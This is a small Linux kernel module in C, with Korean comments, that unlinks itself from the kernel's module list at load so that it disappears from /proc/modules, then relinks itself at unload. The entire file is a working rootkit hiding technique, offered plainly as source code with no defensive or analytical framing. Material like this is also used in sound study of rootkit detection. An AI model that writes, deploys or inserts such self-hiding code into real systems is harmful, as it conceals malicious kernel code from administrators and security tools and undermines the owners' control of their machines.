#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/kobject.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Test User");
MODULE_DESCRIPTION("Remove module from module list");

static struct list_head *prev_module; // 모듈이 제거되기 전, 리스트의 이전 노드를 저장할 변수


//  모듈 리스트에서 현재 모듈을 제거하여 숨김

static int __init hide_init(void) {
    prev_module = THIS_MODULE->list.prev; // 현재 모듈 이전 모듈 저장
    list_del(&THIS_MODULE->list); // 현재 모듈을 리스트에서 삭제
    printk(KERN_INFO "Module hidden from /proc/modules.\n");
    return 0;
}


// 모듈 제거 시 원래 리스트에 다시 추가

static void __exit hide_exit(void) {
    list_add(&THIS_MODULE->list, prev_module); // 원래 위치에 다시 추가
    printk(KERN_INFO "Module restored to /proc/modules.\n");
}

module_init(hide_init);
module_exit(hide_exit);
